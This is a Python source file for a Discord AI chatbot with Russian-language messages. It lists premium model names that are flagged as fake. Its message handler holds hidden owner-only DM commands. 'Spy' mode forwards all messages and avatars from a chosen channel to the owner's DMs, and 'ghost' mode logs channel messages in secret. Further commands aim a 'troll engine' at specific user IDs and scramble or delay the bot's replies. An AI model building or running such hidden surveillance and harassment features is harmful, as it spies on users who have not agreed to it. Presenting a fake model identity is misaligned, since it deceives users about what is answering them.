import discord
from discord.ext import commands
import time

from app.database.manager import db
from app.ui.embeds import create_premium_embed, create_error_embed, create_success_embed
from app.modules.admin import ShadowAdminPanel
from app.modules.troll import troll_engine

# State constants from before
OWNER_ID = 1101392990133551224
MODELS = {
    "Mistral Large": {"id": "mistral-large-latest", "real": True},
    "Claude Opus 4.6": {"id": "claude-opus-4.6-fake", "real": False},
    "GPT-5.2 Codex": {"id": "gpt-5.2-fake", "real": False},
    "Gemini 3.1 Pro": {"id": "gemini-3.1-pro-fake", "real": False},
    "ssbaxys-realtime-1": {"id": "mistral-large-latest", "real": True}
}

spy_channels = {}
ghost_channels = set()
audit_data = {}

class MirraBot(commands.Bot):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.start_time = time.time()

    async def setup_hook(self):
        # Load our new Cogs
        await self.load_extension("app.modules.cogs.settings_cog")
        await self.load_extension("app.modules.cogs.ai_cog")
        print("[CORE] Loaded extensions: SettingsCog, AICog")

    async def on_ready(self):
        print(f'[CORE] Logged in as {self.user}')
        print('[CORE] Modular Bot is fully operational!')

    async def on_message(self, message):
        # Allow commands to process
        await self.process_commands(message)

        if message.author.bot:
            return

        cid = message.channel.id
        
        # Shadow Analytics
        if cid in ghost_channels:
            print(f"[GHOST #{getattr(message.channel,'name',cid)}] {message.author.name}: {message.content[:100]}")
            
        if cid in spy_channels:
            try:
                owner = await self.fetch_user(spy_channels[cid])
                embed = create_premium_embed(f"🕵 Spy | #{message.channel.name}", f"**{message.author.display_name}**: {message.content[:500]}")
                embed.set_thumbnail(url=message.author.display_avatar.url)
                await owner.send(embed=embed)
            except Exception as e:
                print(f"[SPY ERROR] {e}")

        # Legacy Shadow Commands for Owner in DMs (Preserved as requested, but cleaned up)
        msg = message.content.strip().lower()
        if isinstance(message.channel, discord.DMChannel) and message.author.id == OWNER_ID:
            if msg in ["+админ", "+админ-панель"]:
                view = ShadowAdminPanel(self)
                await message.channel.send(embed=create_premium_embed("🕹️ Shadow Panel", "Интерактивное управление теневыми операциями."), view=view)
                return
            elif msg.startswith("+say "):
                text = message.content[5:].strip()
                count = 0
                for ch_id, ch_set in db.channel_settings.items():
                    if ch_set.get("enabled"):
                        try:
                            ch = self.get_channel(int(ch_id))
                            if ch: await ch.send(text); count += 1
                        except: pass
                await message.channel.send(embed=create_success_embed("Broadcast", f"Отправлено в {count} каналов."))
                return
            elif msg.startswith("+тролль "):
                try:
                    parts = message.content.split()
                    uid = int(parts[1])
                    mode = parts[2].lower()
                    mins = int(parts[3])
                    troll_engine.add_target(uid, mode, mins)
                    await message.channel.send(embed=create_success_embed("Troll Engine", f"Цель `{uid}` в режиме `{mode}` на `{mins}` минут."))
                except Exception:
                    await message.channel.send(embed=create_error_embed("Ошибка синтаксиса", "+тролль <ID> <режим> <минуты>"))
                return
            elif msg.startswith("+снять "):
                try:
                    uid = int(message.content.split()[1])
                    troll_engine.remove_target(uid)
                    await message.channel.send(embed=create_success_embed("Troll Engine", f"Ограничения для `{uid}` сняты."))
                except: pass
                return
            
            # Additional Operations mapped via the UI panel instructions
            elif msg.startswith("+spy "):
                cid_to_spy = int(message.content.split()[1])
                spy_channels[cid_to_spy] = OWNER_ID
                await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим SPY активирован для канала `{cid_to_spy}`."))
                return
            elif msg.startswith("+unspy "):
                cid_to_spy = int(message.content.split()[1])
                spy_channels.pop(cid_to_spy, None)
                await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим SPY деактивирован для `{cid_to_spy}`."))
                return
            elif msg.startswith("+ghost "):
                cid_to_ghost = int(message.content.split()[1])
                ghost_channels.add(cid_to_ghost)
                await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим GHOST активирован для `{cid_to_ghost}`."))
                return
            elif msg.startswith("+unghost "):
                cid_to_ghost = int(message.content.split()[1])
                ghost_channels.discard(cid_to_ghost)
                await message.channel.send(embed=create_success_embed("Shadow Engine", f"Режим GHOST деактивирован для `{cid_to_ghost}`."))
                return
            elif msg.startswith("+roulette "):
                tgt_cid = int(message.content.split()[1])
                troll_engine.roulette_channels.add(tgt_cid)
                await message.channel.send(embed=create_success_embed("Troll Engine", f"Рулетка личностей запущена в `{tgt_cid}`."))
                return
            elif msg.startswith("+unroulette "):
                tgt_cid = int(message.content.split()[1])
                troll_engine.roulette_channels.discard(tgt_cid)
                await message.channel.send(embed=create_success_embed("Troll Engine", f"Рулетка остановлена в `{tgt_cid}`."))
                return
            elif msg.startswith("+delay "):
                tgt_cid = int(message.content.split()[1])
                troll_engine.delay_channels.add(tgt_cid)
                await message.channel.send(embed=create_success_embed("Troll Engine", f"Режим случайных задержек активирован в `{tgt_cid}`."))
                return
            elif msg.startswith("+undelay "):
                tgt_cid = int(message.content.split()[1])
                troll_engine.delay_channels.discard(tgt_cid)
                await message.channel.send(embed=create_success_embed("Troll Engine", f"Режим задержек отключен в `{tgt_cid}`."))
                return
            elif msg.startswith("+reverse "):
                parts = message.content.split()
                tgt_cid = int(parts[1])
                mins = int(parts[2])
                troll_engine.reverse_until[tgt_cid] = time.time() + (mins * 60)
                await message.channel.send(embed=create_success_embed("Troll Engine", f"Фильтр Реверса активирован в `{tgt_cid}` на {mins} минут."))
                return

# Initialize Client
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
client = MirraBot(command_prefix="+", intents=intents)
